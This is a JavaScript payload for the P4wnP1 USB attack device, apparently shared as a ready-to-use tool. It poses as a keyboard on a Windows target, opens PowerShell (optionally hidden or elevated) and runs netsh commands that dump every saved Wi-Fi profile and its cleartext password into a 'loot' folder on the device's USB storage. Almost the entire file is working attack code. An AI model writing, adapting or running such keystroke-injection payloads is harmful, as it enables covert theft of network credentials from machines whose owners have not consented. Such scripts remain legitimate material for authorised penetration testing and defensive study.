/*#########################################################################################################################################\
# wifiKeys_extraction.js														   #
# Extraction of known wifi networks and saved wifi passwords    									   #
# Author: chriskalv                                                                                                                        #
#													                                   #
# PREREQUISTES:                                                                                                                            #
# - Enable keyboard and USB mass storage capability on your P4wnP1.                                                                        #
# - Edit global settings below.                                                                                                            #
##########################################################################################################################################*/


////////////////////////// GLOBAL SETTINGS /////////////////////////\
layout("de");			                                   // Keyboard layout
typingSpeed(0,0);		                                   // Typing = really fast
run_as_admin=false;					           // Set to true to execute powershell as Administrator (normally not necessary)
hide=false; 			                                   // Set to true to hide the console window on the target
exit=true;			                                   // Set to true to exit the console once finished
var usb_drive = "TEMPUSB"                                          // The name of the P4wnP1's USB storage device
var key_locale = '\"Schlüsselinhalt\\W+\\:(.+)$\"'                 // String that indicates saved passwords in the Wifi list (e.g. "Schlüsselinhalt" [German], "Key Content" [English])
////////////////////////////////////////////////////////////////////

// Definition of other variables, arrays, ...
var delay_time = 5                                                 // The time to wait before executing the attack in seconds
var ready = "False"                                                // Used to make sure that the attack is ready to be executed

// FUNCTIONS
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");                                           // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10)                                // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {                                       // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True";                                        // Stop the while loop
            break;
        }
    }
}
function attack() {
  // Open powershell
    press("GUI r");
    delay(500);
    if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");     // Hide the console if chosen to do so
    if (run_as_admin) {							       // Run powershell either as admin or standard user
        press("CTRL SHIFT ENTER");
	    delay(1000);
        press("LEFT");
        delay(200);
        press("ENTER");
        delay(200);
    }
    else {
        type("\n");
        delay(1000);
    }
  // Create paths
    type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name);");
    type("$timestamp = Get-Date -Format '(dd-MM-yyyy_HH-mm)';");
    type("$lootfolder = 'loot_' +$timestamp;");
    type("$lootPathWifi = $usbPath+ '' +$lootfolder+ '\\wifi_data\';mkdir $lootPathWifi;");
    delay(200);
  
  // Extract Wifi information/keys
    type("netsh wlan show profiles * > $lootPathWifi\\Known_networks_info.txt;");
    type("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String " + key_locale + " | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > $lootPathWifi\\wifi_keys.txt;")
    delay(1000)
	
  //Exit the console if chosen to do so      
    if (exit) { type("exit\n"); }
}

delay(delay_time * 100);
check_if_ready();
attack();
